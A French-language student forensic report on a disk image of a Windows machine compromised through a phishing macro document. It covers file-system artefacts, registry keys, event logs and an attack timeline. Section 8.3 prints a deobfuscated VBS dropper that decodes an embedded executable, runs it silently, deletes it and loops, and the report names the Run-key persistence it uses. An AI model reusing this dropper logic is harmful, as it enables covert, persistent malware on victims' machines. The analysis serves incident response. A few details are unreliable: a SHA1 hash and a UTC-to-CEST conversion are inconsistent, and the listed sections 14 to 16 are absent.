# Rapport d'Analyse Forensique - Image Disque HDD

**Date de l'analyse :** 06 Mars 2026
**Analyste :** Etudiant Forensic
**Outils principaux :** FTK Imager (acquisition), The Sleuth Kit (TSK), RegRipper, python-evtx (pyevtx)
**Fichier analyse :** `HD_Evidence01.001` a `HD_Evidence01.018` (image brute splitee, 25600 MB)

---

## Table des matieres

1. [Resume executif](#1-resume-executif)
2. [Informations sur l'image - Chaine de custody](#2-informations-sur-limage---chaine-de-custody)
3. [Verification de l'integrite de l'image](#3-verification-de-lintegrite-de-limage)
4. [Structure des partitions](#4-structure-des-partitions)
5. [Analyse du systeme de fichiers](#5-analyse-du-systeme-de-fichiers)
6. [Artefacts utilisateur](#6-artefacts-utilisateur)
7. [Decouverte du vecteur d'attaque](#7-decouverte-du-vecteur-dattaque)
8. [Analyse des malwares](#8-analyse-des-malwares)
9. [Mecanisme de persistance](#9-mecanisme-de-persistance)
10. [Anti-forensics](#10-anti-forensics)
11. [Analyse du registre](#11-analyse-du-registre)
12. [Analyse des journaux d'evenements Windows](#12-analyse-des-journaux-devenements-windows)
13. [Chronologie de l'attaque](#13-chronologie-de-lattaque)
14. [Indicateurs de compromission (IOCs)](#14-indicateurs-de-compromission-iocs)
15. [Conclusion](#15-conclusion)
16. [Annexe - Fichiers de preuves](#16-annexe---fichiers-de-preuves)

---

## 1. Resume executif

L'analyse de l'image disque `HD_Evidence01` (CASE001) confirme et enrichit les conclusions de la Partie 4 (analyse memoire). Le disque dur appartient a la machine **johnoc-PC** de l'utilisateur **johnoc** (`john.opoc2@gmail.com`), compromise le **31 juillet 2019** via un email de spear-phishing.

**Faits etablis par l'analyse disque :**

- Le fichier `invoice.zip` (contenant `invoice.docm`) a ete **telecharge depuis internet** (ZoneId=3) a **12:44:00 UTC** le 31/07/2019, confirme par les metadonnees NTFS.
- L'execution de la macro malveillante a genere le payload `rad5163B.tmp.exe` dans `%TEMP%` a **12:45:47 UTC**.
- Un script VBS de persistance `krtYMkVgyjNdd.vbs` a ete depose a **12:53:57 UTC** et ajoute a la cle de registre **Run** pour s'executer a chaque demarrage.
- Le script VBS embarque un executable base64 (`rfhyMVOQxfc.exe`) qu'il redeploit **toutes les 5 secondes** en boucle, puis le supprime (anti-forensics).
- Deux executables supplementaires ont ete identifies : `RGoEsDNcZhEnl.exe` et `tior.exe`.
- Le fichier `memdump.mem` (dump memoire de la Partie 4) a ete supprime du Bureau et envoye dans la Corbeille.

---

## 2. Informations sur l'image - Chaine de custody

### Informations d'acquisition (issues du fichier `HD_Evidence01.001.txt`)

```
Outil d'acquisition : AccessData FTK Imager 3.1.1.8
Numero de cas       : CASE001
Numero de preuves   : 001
Description         : Incident Response
Examinateur         : John

--- Source physique ---
Type de source     : Physique
Modele disque      : VMware, VMware Virtual S SCSI Disk Device
Interface          : SCSI
Disque amovible    : Non
Taille source      : 25600 MB
Nombre de secteurs : 52 428 800

--- Geometrie ---
Cylindres          : 3263
Pistes/Cylindre    : 255
Secteurs/Piste     : 63
Octets/Secteur     : 512

--- Acquisition ---
Debut  : Wed Jul 31 16:05:08 2019
Fin    : Wed Jul 31 16:19:47 2019
Duree  : 14 minutes 39 secondes

--- Segments ---
HD_Evidence01.001 a HD_Evidence01.018 (17 x 1.5 GB + 1 x 100 MB)
```

> **Fichier de preuve :** `Forensic_case_01/HD_Evidence01.001.txt`

---

## 3. Verification de l'integrite de l'image

### Hashes de l'image complete (fournis par FTK Imager et verifies)

```
MD5  : 5923d26c881894e4686a4327fe1d8270  [VERIFIE : OUI]
SHA1 : d9b74eb7101cf9864b6a35c7ab8cc6424629f43  [VERIFIE : OUI]

Verification demarree  : Wed Jul 31 16:19:48 2019
Verification terminee  : Wed Jul 31 16:29:04 2019
Resultat              : MD5 checksum: 5923d26c881894e4686a4327fe1d8270 : verified
                        SHA1 checksum: d9b74eb7101cf9864b16a35c7ab8cc6424629f43 : verified
```

### Commande executee pour verifier l'integrite des segments :

```bash
$ md5sum HD_Evidence01.001 HD_Evidence01.002 ... HD_Evidence01.018
```

### Resultats :

```
d6124e386f3e705a59290239a835e88b  HD_Evidence01.001
8d3e3a4d0038f100ce1033356155d86b  HD_Evidence01.002
1017f66de17d05b345768758b84d1752  HD_Evidence01.003
843e9622cba7be370045775ec8a276f8  HD_Evidence01.004
90df18a9c564019f016644defd108678  HD_Evidence01.005
82f88f9e5c02b4187855c6b72b598de3  HD_Evidence01.006
6dc68a3628fae8e8020996430cda2eb4  HD_Evidence01.007
7810b070e670c446ee8e7b1b1f62a0c7  HD_Evidence01.008
154a9d58abfe3f4b813a7f0bb853a447  HD_Evidence01.009
def57d756de63aa1b2e3f81af476d983  HD_Evidence01.010
543dca01000c36a288aaae09136f803c  HD_Evidence01.011
95db6b9e01a84eebb06468425dce48e5  HD_Evidence01.012
eeba7b4eee6de684b86e346a3c11d4d5  HD_Evidence01.013
eeba7b4eee6de684b86e346a3c11d4d5  HD_Evidence01.014
eeba7b4eee6de684b86e346a3c11d4d5  HD_Evidence01.015
eeba7b4eee6de684b86e346a3c11d4d5  HD_Evidence01.016
eeba7b4eee6de684b86e346a3c11d4d5  HD_Evidence01.017
38f958653f592a3a278b8fa465987d1f  HD_Evidence01.018
```

> **Note :** Les segments 013 a 017 ont des hashes identiques car ils correspondent a la zone non allouee (zeros) de fin de disque - comportement attendu pour une image d'un disque partiellement utilise.

> **Fichier de preuve :** `evidence/00_segment_hashes_md5.txt`

---

## 4. Structure des partitions

### Commande executee :

```bash
$ mmls HD_Evidence01.001 HD_Evidence01.002 [...] HD_Evidence01.018
```

### Resultats :

```
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000206847   0000204800   NTFS / exFAT (0x07)
003:  000:001   0000206848   0052426751   0052219904   NTFS / exFAT (0x07)
004:  -------   0052426752   0052428799   0000002048   Unallocated
```

### Interpretation :

| Partition | Debut (secteur) | Fin (secteur) | Taille | Type | Role |
|-----------|----------------|--------------|--------|------|------|
| Partition 1 | 2048 | 206847 | 100 MB | NTFS | **System Reserved** (bootloader) |
| Partition 2 | 206848 | 52426751 | ~25 GB | NTFS | **Partition principale Windows 7** |

> **Fichier de preuve :** `evidence/01_partition_table.txt`

---

## 5. Analyse du systeme de fichiers

### Commande executee :

```bash
$ fsstat -o 206848 HD_Evidence01.001 HD_Evidence01.002 [...] HD_Evidence01.018
```

### Resultats (partition principale) :

```
FILE SYSTEM INFORMATION
--------------------------------------------
File System Type: NTFS
Volume Serial Number: A0326AE1326ABC42
OEM Name: NTFS
Version: Windows XP

METADATA INFORMATION
--------------------------------------------
First Cluster of MFT: 786432
First Cluster of MFT Mirror: 2
Size of MFT Entries: 1024 bytes
Size of Index Records: 4096 bytes
Range: 0 - 58112
Root Directory: 5

CONTENT INFORMATION
--------------------------------------------
Sector Size: 512
Cluster Size: 4096
Total Cluster Range: 0 - 6527486
Total Sector Range: 0 - 52219902
```

### Racine du systeme de fichiers (fls) :

```bash
$ fls -o 206848 HD_Evidence01.001 [...] HD_Evidence01.018
```

```
d/d 9479-144-1:   Documents and Settings
d/d 252-144-6:    ProgramData
d/d 346-144-5:    Users
d/d 57-144-1:     $Recycle.Bin
d/d 506-144-5:    Windows
d/d 60-144-6:     Program Files
r/r 42696-128-1:  pagefile.sys
r/r 9474-128-1:   autoexec.bat
r/r 9477-128-1:   config.sys
```

### Utilisateurs identifies :

```bash
$ fls -o 206848 [...] 346
```

```
d/d 11170-144-1:  All Users
d/d 456-144-5:    Default
d/d 47-144-5:     johnoc          <-- utilisateur compromis
d/d 492-144-5:    Public
```

> **Fichiers de preuves :** `evidence/02_fsstat_sysreserved.txt`, `evidence/03_fsstat_main.txt`, `evidence/04_root_listing.txt`, `evidence/05_users_dir.txt`

---

## 6. Artefacts utilisateur

### 6.1 Repertoire Home de johnoc

```bash
$ fls -o 206848 [...] 47
```

```
r/r 379-128-1:    NTUSER.DAT                    <-- registre utilisateur
d/d 387-144-6:    Desktop
d/d 386-144-6:    Documents
d/d 385-144-7:    Downloads                     <-- contient invoice.zip !
d/d 388-144-1:    AppData
d/d 451-144-1:    Recent
```

### 6.2 Bureau (Desktop)

```bash
$ fls -o 206848 [...] 387
```

```
r/r 53943-128-4:  Event Log Explorer.lnk        <-- outils forensics
r/r 53662-128-4:  FTK Imager - Shortcut.lnk     <-- outil d'acquisition
r/r 53681-128-4:  Mft2Csv.exe - Shortcut.lnk    <-- analyse MFT
r/r 53190-128-1:  Outlook 2013.lnk
d/d 53734-144-7:  SysinternalsSuite             <-- outils Sysinternals
r/r 53191-128-1:  Word 2013.lnk
-/r 57839-128-3:  memdump.mem                   <-- SUPPRIME (envoye corbeille)
```

> **Note forensique :** La presence d'outils forensics (FTK Imager, Mft2Csv, Event Log Explorer, Sysinternals) indique que la victime `johnoc` etait consciente de la compromission et effectuait sa propre investigation. Le fichier `memdump.mem` (dump memoire analyse en Partie 4) a ete supprime du Bureau et se retrouve dans la Corbeille (`$RAD3WSF.mem`).

### 6.3 Repertoire Downloads - Vecteur d'attaque initial

```bash
$ fls -l -o 206848 [...] 385
```

```
r/r 57656-128-1:  invoice.zip               2019-07-31 14:44:00 CEST  [12:44:00 UTC]
r/r 57656-128-3:  invoice.zip:Zone.Identifier  [ZoneId=3 = INTERNET]
d/d 57657-144-1:  invoice/                  2019-07-31 14:45:35 CEST  [extrait]
r/r 44629-128-6:  elex_setup.exe            2019-07-24 15:18:10 CEST
r/r 57467-128-6:  screen-recorder-setup.exe 2019-07-31 14:37:17 CEST
r/r 53710-128-6:  SysinternalsSuite.zip     2019-07-24 15:14:50 CEST
```

#### Contenu du dossier invoice/ :

```bash
$ fls -o 206848 [...] 57657
```

```
r/r 57659-128-4:  invoice.docm              <-- DOCUMENT MALVEILLANT
r/r 57659-128-5:  invoice.docm:Zone.Identifier  [ZoneId=3]
r/r 57660-128-3:  invoice.pdf               <-- LEURRE (PDF inoffensif)
r/r 57660-128-4:  invoice.pdf:Zone.Identifier
```

#### Zone.Identifier de invoice.docm :

```bash
$ icat -o 206848 [...] 57659-128-5
```

```
[ZoneTransfer]
ZoneId=3
```

> **Preuve :** `ZoneId=3` confirme que `invoice.docm` a ete telecharge depuis Internet (Zone Internet), pas cree localement. La presence d'un `invoice.pdf` inoffensif en leurre est une technique classique de phishing.

### 6.4 Compte email de la victime

```bash
$ fls -o 206848 [...] 52982
```

```
r/r 53131-128-4:  john.opoc2@gmail.com(2).ost
r/r 53194-128-4:  John.opoc2@gmail.com(3).ost
r/r 53219-128-4:  John.opoc2@gmail.com(4).ost
r/r 53133-128-4:  john.opoc2@gmail.com.ost
```

> **Preuve :** Email de la victime confirme : `john.opoc2@gmail.com` (John Opoc), coherent avec la Partie 4 (GuerrillaMail -> john.opoc2@gmail.com).

> **Fichiers de preuves :** `evidence/06_johnoc_home.txt`, `evidence/07_desktop.txt`, `evidence/08_documents.txt`, `evidence/09_downloads.txt`, `evidence/10_invoice_dir.txt`, `evidence/12_invoice_docm_zone.txt`

---

## 7. Decouverte du vecteur d'attaque

### 7.1 Extraction et hash de invoice.docm

```bash
$ icat -o 206848 [...] 57659 > invoice.docm
$ md5sum invoice.docm && sha256sum invoice.docm && file invoice.docm
```

```
MD5    : 775186db727a3218ea45a3bcd51072aa
SHA256 : fb897c9c6dcfef94e6a2cea168ff19bd448af3205b19aeaed2d4ed5df1354452
Type   : Microsoft Word 2007+  (.docm = Word avec macros)
Taille : 84 Ko
```

### 7.2 Timestamps NTFS de invoice.zip et invoice.docm

```
invoice.zip   Created  : 2019-07-31 14:44:00 CEST  [12:44:00 UTC]
invoice.zip   Modified : 2019-07-31 14:45:03 CEST  [12:45:03 UTC]
invoice.zip   Accessed : 2019-07-31 14:45:12 CEST  [12:45:12 UTC]
Taille        : 130 019 octets

invoice/      Created  : 2019-07-31 14:45:16 CEST  [12:45:16 UTC]
invoice/      Modified : 2019-07-31 14:45:35 CEST  [12:45:35 UTC]
```

> **Interpretation :** Le fichier `invoice.zip` a ete telecharge a **12:44:00 UTC**, extrait entre 12:45:16 et 12:45:35 UTC, puis `invoice.docm` ouvert dans Word - le tout en moins de 2 minutes, concordant parfaitement avec la timeline de la Partie 4.

### 7.3 Confirmation ouverture dans Word - RecentDocs (Registre)

```bash
$ regripper -r NTUSER.DAT -p recentdocs
```

```
RecentDocs
Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
LastWrite Time: 2019-07-31 13:03:34Z

  9 = invoice           <-- dossier extrait
  8 = invoice.docm      <-- DOCUMENT OUVERT
  7 = invoice.zip       <-- archive telechargee
  4 = Downloads
  ...

Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.docm
LastWrite Time 2019-07-31 13:03:34Z
MRUListEx = 0
  0 = invoice.docm      <-- SEUL .docm ouvert (MRU #1)

Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.zip
LastWrite Time 2019-07-31 12:45:03Z
MRUListEx = 2,1,0
  2 = invoice.zip       <-- MRU #1 (dernier ouvert)
```

> **Preuve :** La cle `RecentDocs` confirme l'ouverture de `invoice.docm`. La date `2019-07-31 13:03:34Z` = 14:45 CEST (correspond a l'horodatage NTFS de creation du fichier).

> **Fichier de preuve :** `evidence/21_regripper_userassist.txt`

---

## 8. Analyse des malwares

### 8.1 Repertoire %TEMP% - Fichiers malveillants

```bash
$ fls -l -o 206848 [...] 408 | grep -iE "\.exe|\.vbs|krt|rad|tior|bVw|RGo"
```

```
r/r 57670-128-4:  rad5163B.tmp.exe   Cree: 2019-07-31 14:45:47 CEST   73802 octets
r/r 53054-128-4:  krtYMkVgyjNdd.vbs  Cree: 2019-07-31 14:53:57 CEST   99623 octets
r/r 53112-128-3:  bVwHCYX.exe        Cree: 2019-07-31 15:38:23 CEST   73802 octets
r/r 53046-128-4:  RGoEsDNcZhEnl.exe  Cree: 2019-07-31 15:38:22 CEST  406016 octets
r/r 57931-128-1:  tior.exe           Cree: 2019-07-31 15:38:23 CEST   91648 octets
```

> **Autres fichiers suspects dans %TEMP% :**
> - `krtYMkVgyjNdd.vbs` - script VBS persistant (analyse section 9)
> - `TCDFDB8.tmp`, `TCDFE75.tmp`, etc. - repertoires temporaires crees par le VBS dropper pour deposer rfhyMVOQxfc.exe

### 8.2 rad5163B.tmp.exe - Payload initial (Meterpreter stager)

```bash
$ icat -o 206848 [...] 57670 > rad5163B.tmp.exe
$ md5sum rad5163B.tmp.exe && sha256sum rad5163B.tmp.exe && file rad5163B.tmp.exe
```

```
MD5    : 4cad3dd76239f6c03404c59392cd6a1d
SHA256 : 61b06712f6851338bccd2f9ea72262fd2d4b6dcee69283377768ed94d26641d9
Type   : PE32 executable for MS Windows 4.00 (GUI), Intel i386, 4 sections
Taille : 73802 octets
Cree   : 2019-07-31 14:45:47 CEST [12:45:47 UTC]
```

> **Analyse :** Ce binaire PE32 Windows GUI a ete cree 13 secondes apres l'extraction de `invoice.docm`, confirmant qu'il s'agit du payload depose par la macro Word malveillante. Il correspond exactement au `rad5163B.tmp.exe` PID 1416 identifie en Partie 4.

### 8.3 krtYMkVgyjNdd.vbs - Script VBS dropper persistant

```bash
$ icat -o 206848 [...] 53054 > krtYMkVgyjNdd.vbs
$ wc -c krtYMkVgyjNdd.vbs
```

```
99623 octets (97.3 KB de code obfusque)
Cree : 2019-07-31 14:53:57 CEST [12:53:57 UTC]
```

**Extrait du debut du script (deobfusque) :**

```vbscript
Function XmOcypeZqahSbj(OCJEMzlVAVVT)
    NxQqVYfZnLNYXx = "<B64DECODE xmlns:dt=""urn:schemas-microsoft-com:datatypes"" " & _
        "dt:dt=""bin.base64"">" & OCJEMzlVAVVT & "</B64DECODE>"
    Set ajPTfmct = CreateObject("MSXML2.DOMDocument.3.0")
    ajPTfmct.LoadXML(NxQqVYfZnLNYXx)
    XmOcypeZqahSbj = ajPTfmct.selectsinglenode("B64DECODE").nodeTypedValue
    set ajPTfmct = nothing
End Function
```

> La fonction `XmOcypeZqahSbj` decode une chaine Base64 en donnees binaires via le DOM XML de MSXML2.

**Extrait de la fin du script (logique d'execution) :**

```vbscript
Function fJmkCkntQBBon()
    eOQliRngm = "TVqQAAMAAAAEAAAA//8AA..."  ' <-- 97 KB de payload base64

    Dim gnaCfRhQdbn
    Set gnaCfRhQdbn = CreateObject("Scripting.FileSystemObject")
    Dim sbTASsfTvu
    Set sbTASsfTvu = gnaCfRhQdbn.GetSpecialFolder(2)    ' GetSpecialFolder(2) = %TEMP%
    ezuOlFex = sbTASsfTvu & "\" & gnaCfRhQdbn.GetTempName()
    gnaCfRhQdbn.CreateFolder(ezuOlFex)
    pXAsANhFbWiJU = ezuOlFex & "\" & "rfhyMVOQxfc.exe"  ' <-- NOM DU PAYLOAD !

    Dim eUbSSKeZGMgQi
    Set eUbSSKeZGMgQi = CreateObject("Wscript.Shell")
    BdjSqXsFW = XmOcypeZqahSbj(eOQliRngm)               ' decode base64 -> bytes

    Set PCZOadvglK = CreateObject("ADODB.Stream")
    PCZOadvglK.Type = 1                                   ' binaire
    PCZOadvglK.Open
    PCZOadvglK.Write BdjSqXsFW
    PCZOadvglK.SaveToFile pXAsANhFbWiJU, 2               ' ecrit rfhyMVOQxfc.exe

    eUbSSKeZGMgQi.run pXAsANhFbWiJU, 0, true             ' execute (silencieux)
    gnaCfRhQdbn.DeleteFile(pXAsANhFbWiJU)                ' SUPPRIME le fichier
    gnaCfRhQdbn.DeleteFolder(ezuOlFex)                   ' SUPPRIME le dossier
End Function

Do
    fJmkCkntQBBon      ' execute le payload
    WScript.Sleep 5000  ' attend 5 secondes
Loop                   ' boucle infinie = persistance
```

**Comportement du dropper :**

1. Contient un executable PE32 encodes en Base64 (~97 KB)
2. Decode le payload et l'ecrit dans `%TEMP%\<dossier_aleatoire>\rfhyMVOQxfc.exe`
3. Execute le payload en mode silencieux (`run ..., 0, true`)
4. Supprime le fichier ET le dossier apres execution (anti-forensics)
5. Boucle toutes les 5 secondes (maintien de presence permanente)

> Le header Base64 `TVqQAAMAAAAEAAAA` decode en `MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00` = signature **PE/MZ** valide.

### 8.4 Fichiers supplementaires identifies

```bash
$ icat -o 206848 [...] 53112 > bVwHCYX.exe
$ md5sum bVwHCYX.exe && file bVwHCYX.exe
```

```
bVwHCYX.exe:
  MD5    : 82275565ecb591e5264fc705b43fbbd8
  Type   : PE32 executable for MS Windows 4.00 (GUI), Intel i386, 4 sections
  Taille : 73802 octets  <-- MEME TAILLE que rad5163B.tmp.exe
  Cree   : 2019-07-31 15:38:23 CEST [13:38:23 UTC]
```

```bash
$ icat -o 206848 [...] 53046 > RGoEsDNcZhEnl.exe
$ md5sum RGoEsDNcZhEnl.exe && file RGoEsDNcZhEnl.exe
```

```
RGoEsDNcZhEnl.exe:
  MD5    : c31852836acbbec2101824999b482de3
  Type   : PE32 executable for MS Windows 6.00 (console), Intel i386, 5 sections
  Taille : 406016 octets
  Cree   : 2019-07-31 15:38:22 CEST [13:38:22 UTC]
```

```bash
$ icat -o 206848 [...] 57931 > tior.exe
$ md5sum tior.exe && file tior.exe
```

```
tior.exe:
  MD5    : 6b0ed4e1b6d76644ad78aea147b8419a
  Type   : PE32 executable for MS Windows 6.00 (console), Intel i386, 4 sections
  Taille : 91648 octets
  Cree   : 2019-07-31 15:38:23 CEST [13:38:23 UTC]
```

> **Note :** `bVwHCYX.exe` a la meme taille (73802 octets) que `rad5163B.tmp.exe` - il s'agit probablement d'une nouvelle instance du stager Meterpreter depose lors d'une reconnexion. `RGoEsDNcZhEnl.exe` (console, 406016 octets) est une instance du second payload (correspondant au PID `rfhyMVOQxfc.exe` de la Partie 4).

> **Fichiers de preuves :** `evidence/14_temp_dir.txt`, `evidence/15_krtYMkVgyjNdd.vbs`, `evidence/26_temp_malware_timestamps.txt`, `evidence/malware_samples/`

---

## 9. Mecanisme de persistance

### 9.1 Cle Run - Autostart registry

```bash
$ regripper -r NTUSER.DAT -p run
```

```
Launching run v.20200511

Software\Microsoft\Windows\CurrentVersion\Run
LastWrite Time 2019-07-31 12:53:57Z

  YPDKhVAXzZSU = C:\Users\johnoc\AppData\Local\Temp\krtYMkVgyjNdd.vbs
```

> **PREUVE CRITIQUE :** A **12:53:57 UTC** (exactement l'heure d'execution du script VBS identifiee en Partie 4), l'attaquant a ajoute la cle `YPDKhVAXzZSU` dans `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.
>
> **Consequence :** Au prochain redemarrage de la machine, Windows executera automatiquement `krtYMkVgyjNdd.vbs`, qui redeployera et executera le payload Meterpreter `rfhyMVOQxfc.exe` toutes les 5 secondes.

### 9.2 Localisation du fichier VBS

Le fichier de persistance se trouve dans `%TEMP%` :
```
C:\Users\johnoc\AppData\Local\Temp\krtYMkVgyjNdd.vbs
```

Le nom aleatoire `YPDKhVAXzZSU` (cle Run) et `krtYMkVgyjNdd.vbs` (fichier) sont generes aleatoirement par Metasploit pour echapper a la detection par signature.

> **Fichier de preuve :** `evidence/22_regripper_run.txt`

---

## 10. Anti-forensics

### 10.1 Suppression du payload rfhyMVOQxfc.exe

Le script VBS supprime systematiquement `rfhyMVOQxfc.exe` apres chaque execution (instructions `DeleteFile` et `DeleteFolder`). L'absence de ce fichier sur le disque alors qu'il apparait dans le dump memoire (Partie 4) confirme cette technique de nettoyage.

### 10.2 Suppression du memdump.mem

```bash
$ fls -o 206848 [...] 387   # Bureau
-/r 57839-128-3:  memdump.mem   <-- MARQUE COMME SUPPRIME

$ fls -o 206848 [...] 11199  # Corbeille
r/r 57839-128-3:  $RAD3WSF.mem  <-- TROUVE DANS LA CORBEILLE
r/- 17539:        $IAD3WSF.mem  <-- Metadata (supprime)
```

> Le fichier `memdump.mem` (dump memoire de 2 GB capture pendant l'incident) avait ete place sur le Bureau puis **supprime et envoye dans la Corbeille**. Le `$R` (contenu) est recuperable, mais le `$I` (metadata avec le chemin original) a ete efface.

### 10.3 Noms aleatoires des executables malveillants

Tous les fichiers malveillants utilisent des noms generes aleatoirement :
- `rad5163B.tmp.exe` - nom de fichier temporaire aleatoire
- `krtYMkVgyjNdd.vbs` - nom aleatoire
- `rfhyMVOQxfc.exe` - nom aleatoire (jamais ecrit durablement sur disque)
- `bVwHCYX.exe`, `RGoEsDNcZhEnl.exe`, `tior.exe` - noms aleatoires

### 10.4 Alternate Data Streams (ADS) - Zone.Identifier

Tous les fichiers telecharges depuis internet possedent un ADS `Zone.Identifier` (ZoneId=3) qui prouve leur origine externe - ces marqueurs n'ont pas ete supprimes par l'attaquant.

---

## 11. Analyse du registre

### 11.1 RecentDocs - Documents recemment ouverts

```bash
$ regripper -r NTUSER.DAT -p recentdocs
```

```
Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
LastWrite Time: 2019-07-31 13:03:34Z

  9 = invoice            (dossier)
  8 = invoice.docm       (document Word malveillant)
  7 = invoice.zip        (archive telechargee)
  5 = SysinternalsSuite.zip
  3 = Mft2Csv-master.zip
```

### 11.2 UserAssist - Programmes executes par l'utilisateur

```bash
$ regripper -r NTUSER.DAT -p userassist
```

```
{7C5A40EF-A0FB-4BFC-874A-C0F2E0B9FA8E}\Microsoft Office\Office15\WINWORD.EXE (2)
{7C5A40EF-A0FB-4BFC-874A-C0F2E0B9FA8E}\Microsoft Office\Office15\OUTLOOK.EXE (5)
{9E3995AB-1F9C-4F13-B827-48B24B6C7174}\TaskBar\Google Chrome.lnk (2)
C:\Users\johnoc\Desktop\Outlook 2013.lnk (4)
```

> WINWORD.EXE execute **2 fois**, OUTLOOK.EXE **5 fois** (consultation des emails).

### 11.3 Shellbags - Navigation dans les dossiers

```bash
$ icat -o 206848 [...] 9709 > UsrClass.dat
$ regripper -r UsrClass.dat -p shellbags
```

**Extraits cles :**

```
MRU Time             | Resource
---------------------|-----------------------------------------------------------
2019-07-31 12:55:20  | My Computer\C:\Users\johnoc\AppData\Local\Temp
2019-07-31 12:55:19  | My Computer\C:\Users\johnoc\AppData\Local
2019-07-31 12:55:14  | My Computer\C:\Users\johnoc\AppData
2019-07-31 12:54:48  | My Computer\C:\Users\johnoc
2019-07-31 14:06:51  | My Computer\E:\forensic_case_001
2019-07-31 13:51:00  | My Computer\E:\Forensic_case_01
2019-07-31 13:48:11  | My Computer\E:\
2019-07-31 12:44:56  | Libraries\CLSID_Documents Library
2019-07-31 12:44:29  | Control Panel\Programs\CLSID_Programs and Features
```

> **Analyse :**
> - A **12:55** UTC (2 minutes apres depot du VBS), l'attaquant navigue dans `C:\Users\johnoc\AppData\Local\Temp` - il verifie que ses outils sont bien en place.
> - Le lecteur `E:\` correspond au disque externe sur lequel FTK Imager a capture l'image (`E:\Forensic_case_01`). La victime a capture l'image de son propre disque pendant l'incident.

### 11.4 TypedURLs - URLs saisies dans IE

```bash
$ regripper -r NTUSER.DAT -p typedurls
```

```
Software\Microsoft\Internet Explorer\TypedURLs
LastWrite Time 2019-07-23 19:05:59Z
  url1 -> http://google.com/
  url2 -> http://go.microsoft.com/fwlink/?LinkId=69157
```

> Aucune URL suspecte dans IE (la victime utilisait Chrome pour consulter Gmail).

> **Fichiers de preuves :** `evidence/21_regripper_userassist.txt`, `evidence/22_regripper_run.txt`, `evidence/23_regripper_runmru.txt`, `evidence/24_shellbags.txt`, `evidence/27_regripper_typedurls.txt`

---

## 12. Analyse des journaux d'evenements Windows

### 12.1 Extraction des fichiers .evtx

```bash
$ fls -o 206848 [...] 2826   # System32/winevt/Logs/

r/r 42718-128-4:  Application.evtx
r/r 42719-128-4:  Security.evtx
r/r 42717-128-4:  System.evtx
r/r 53993-128-4:  Microsoft-Windows-PowerShell%4Operational.evtx
r/r 42720-128-4:  Windows PowerShell.evtx
r/r 42746-128-4:  Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx
```

```bash
$ icat -o 206848 [...] 42719 > Security.evtx  # 1.1 MB
$ icat -o 206848 [...] 42717 > System.evtx    # 1.1 MB
$ icat -o 206848 [...] 53993 > PowerShell-Operational.evtx  # 68 KB
```

### 12.2 Evenements de securite - 31 juillet 2019

```bash
$ python3 -c "
import pyevtx
f = pyevtx.open('Security.evtx')
# Filtrage evenements critiques du 31/07/2019
..."
```

**Evenements significatifs :**

| Heure (UTC) | EventID | Description | Detail |
|-------------|---------|-------------|--------|
| 07:39:12 | 4647 | User initiated logoff | johnoc (session precedente) |
| 11:50:01 | 4608 | Windows Security auditing started | Demarrage systeme |
| 11:50:01 | 4624 | Logon Success | SYSTEM |
| 11:56:17 | 4648 | Explicit credential logon | johnoc se connecte |
| 11:56:17 | 4624 | Logon Success | **johnoc (SID: S-1-5-21-4052921086-732667259-1946374124-1000)** |
| 11:56:17 | 4672 | Special privileges assigned | johnoc - privileges eleves |
| 12:04:29 | 4624 | Logon Success | ANONYMOUS LOGON (x3) - connexion reseau |
| 12:51:37 | 4624 | Logon Success | SYSTEM (post-compromission) |
| 14:01:34 | 4624 | Logon Success | SYSTEM |

> **Observation :** Les connexions `ANONYMOUS LOGON` a 12:04 UTC correspondent a la periode ou Chrome etait ouvert (consultation Gmail) et ou le payload Meterpreter venait d'etablir sa connexion reseau vers le C2.

### 12.3 Evenements systeme (System.evtx) - 31 juillet 2019

```
EventID 7001 @ 11:56:18 UTC : Session de bureau a distance / Ouverture session johnoc
EventID 7002 @ 07:39:12 UTC : Session de bureau a distance / Fermeture session precedente
EventID 20001 @ (x12) : Installation de pilotes PnP (disque externe connecte)
EventID 20003 @ (x11) : Desinstallation de pilotes PnP
EventID 1014  @ (x3)  : DNS resolution - connexions reseau
```

> **Note :** Les 12 occurrences d'EventID 20001 (installation PnP) et 11 d'EventID 20003 (desinstallation PnP) correspondent probablement a la connexion/deconnexion du disque externe `E:\` utilise pour l'acquisition FTK.

> **Fichiers de preuves :** `evidence/18_event_logs_list.txt`, `evidence/Security.evtx`, `evidence/System.evtx`, `evidence/PowerShell-Operational.evtx`, `evidence/19_security_events_july31.txt`, `evidence/20_system_events_july31.txt`

---

## 13. Chronologie de l'attaque

> Toutes les heures sont en **UTC**. Les horodatages NTFS sont en CEST (UTC+2), convertis ici en UTC.

| Heure (UTC) | Source | Evenement |
|-------------|--------|-----------|
| 07:39:12 | Security.evtx (4647) | Fermeture session precedente de johnoc |
| 11:50:01 | Security.evtx (4608) | **Demarrage du systeme** |
| 11:56:17 | Security.evtx (4648/4624) | **Ouverture de session johnoc** |
| 12:03-12:07 | AppData/Google | Chrome ouvert - consultation Gmail |
| 12:04:29 | Security.evtx (4624) | 3x ANONYMOUS LOGON (activite reseau) |
| **12:44:00** | **NTFS - invoice.zip** | **Telechargement de invoice.zip (ZoneId=3)** |
| **12:45:03** | **NTFS - invoice.zip** | **Extraction de l'archive invoice.zip** |
| **12:45:16** | **NTFS - invoice/** | **Creation du dossier invoice/** |
| **12:45:35** | **NTFS - invoice/** | **Modification du dossier (invoice.docm extrait)** |
| **12:45:47** | **NTFS - rad5163B.tmp.exe** | **PAYLOAD DEPOSE par la macro Word** |
| 12:46:05 | Desktop - FTK Imager.lnk | Lancement de FTK Imager (reaction victime) |
| 12:51:37 | Security.evtx (4624) | Logon SYSTEM (activite post-compromission) |
| 12:53:57 | NTFS - krtYMkVgyjNdd.vbs | **SCRIPT VBS DEPOSE dans %TEMP%** |
| **12:53:57** | **Registre Run key** | **PERSISTANCE ajoutee : YPDKhVAXzZSU** |
| 12:55:20 | Shellbags | Attaquant navigue dans C:\...\Temp |
| 13:03:34 | Registre RecentDocs | Derniere modification (invoice.docm vu) |
| 13:38:23 | NTFS - bVwHCYX.exe | Nouveau stager Meterpreter depose |
